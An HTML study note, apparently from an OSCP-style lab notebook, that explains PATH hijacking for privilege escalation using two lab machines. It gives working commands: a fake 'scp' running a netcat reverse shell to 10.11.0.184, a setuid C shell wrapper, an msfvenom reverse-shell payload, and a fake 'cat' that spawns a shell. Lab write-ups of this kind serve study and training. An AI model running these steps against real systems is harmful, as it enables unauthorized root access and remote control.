<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>$PATH Variable</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># $PATH variable</h1></strong><br />The <code>PATH</code> variable is an environement variable which tells the user&#39;s shell where to look for executables.<br /><br />One thing to note about the PATH variable is that the system will search through the directories in PATH in the order that they&#39;re listed.<br /><br />That is, a PATH of <br /><code>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> <br />will tell the system to:<br />• first look in <code>/usr/local/sbin</code><br />• then <code>/usr/local/bin</code><br />• then <code>/usr/sbin</code><br />• etc.<br /><br /><strong><h2>## Exploit a . (full stop) in the PATH</h2></strong><br />When <code>.</code> is added to the PATH, Linux will check the current directory for your specified binary.<br />Having <code>.</code> in your PATH means that the user is able to execute binaries/scripts from the current directory without specifying <code>./&lt;binary&gt;</code><br /><br />This is vulnerable to privilege escalation.<br /><br /><strong>Links</strong><br />• <a href="https://hackmag.com/security/reach-the-root/">https://hackmag.com/security/reach-the-root/</a><br />• <a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a><br /><br /><strong>Examples</strong><br />• VulnHub PwnLab Init<br />• oscp 10.11.1.136 - Sufferance<br /><br /><strong><h3>### Example #1 - oscp Sufferance</h3></strong><br /><code>scp</code> is not being run from its abosolute path<br /><br />1. Modify the PATH to include <code>.</code><br /><div class="codebox"><div class="codebox">bob@sufferance:/tmp$&nbsp;echo&nbsp;$PATH<br />/usr/local/bin:/usr/bin:/bin:/usr/games<br />bob@sufferance:/tmp$&nbsp;export&nbsp;PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/games</div></div><br /><br />2. Create a malicious <code>scp</code> file/binary and make it executable<br /><div class="codebox"><div class="codebox">bob@sufferance:/tmp$&nbsp;nano&nbsp;scp<br />[...]<br />#!/bin/bash<br />nc&nbsp;10.11.0.184&nbsp;9001&nbsp;-e&nbsp;/bin/bash<br /><br />bob@sufferance:/tmp$&nbsp;chmod&nbsp;+x&nbsp;scp</div></div><br /><br />3. Run binary that&#39;s calling <code>scp</code> not by its absolute path. <br />4. You should receive a reverse shell.<br /><div class="codebox"><div class="codebox">bob@sufferance:/tmp$&nbsp;/usr/local/bin/uploadtosecure</div></div><br /><br />IF THAT DOESN&#39;T WORK...<br />Just because a binary HAS a set-uid bit to run as root, it doesn&#39;t mean that it WILL run as root.<br />To solve this, we need to write a system binary that calls <code>setuid(0)</code> and <code>setgid(0)</code> to force to calling processes to run as root. <br /><br />Like this:<br /><div class="codebox"><div class="codebox">int&nbsp;main(void)<br />{<br />setgid(0);<br />setuid(0);<br />execl(&quot;/bin/sh&quot;,&nbsp;&quot;sh&quot;,&nbsp;0);<br />}</div></div><br /><br />If you have problems compiling this/getting it work, just use msfvenom to generate a reverse shell binary.<br /><div class="codebox"><div class="codebox">┌─[root@parrot]─[/oscp/10.11.1.136]<br />└──╼&nbsp;#msfvenom&nbsp;-p&nbsp;linux/x86/shell_reverse_tcp&nbsp;LHOST=10.11.0.184&nbsp;LPORT=9001&nbsp;-f&nbsp;elf&nbsp;-o&nbsp;reverse.elf</div></div><br /><br /><strong><h3>### Example #2 - PwnLab init</h3></strong><br />Currently we&#39;re the user Kane. <br />A binary called <code>msgmike</code> in Kane&#39;s home directory tries to read <code>/home/mike/msg.txt</code><br /><br />Checking the strings for the binary, it&#39;s using <code>cat</code> but not by it&#39;s absolute path - <code>/bin/cat</code><br /><div class="codebox"><div class="codebox">kane@pwnlab:~$&nbsp;strings&nbsp;msgmike<br />...<br />cat&nbsp;/home/mike/msg.txt<br />...&nbsp;&nbsp;</div></div>  <br />The <code>msgmike</code> binary runs with Mike&#39;s permissions.<br />Because <code>cat</code> isn&#39;t being called by its absolute path at <code>/bin/cat</code>, we can make our own <code>cat</code> and have it run by editing our PATH variable to include <code>.</code>, which will search the current directory for the <code>cat</code> binary first before checking the usual locations.<br />  <br />1) Edit our path to include <code>.</code> (at the start)<br /><code>export PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code><br /><br />2) Move to /tmp and write our own <code>cat</code> command (which spawns a shell)<br /><code>cd /tmp</code><br /><code>echo &quot;/bin/sh&quot; &gt; cat</code><br /><br />3) Execute our custom <code>cat</code> using the <code>msgmike</code> binary, which runs as Mike, to get a shell as mike.<br /><code>/home/kane/msgmike</code><br /><br /></div>
</body>
</html>
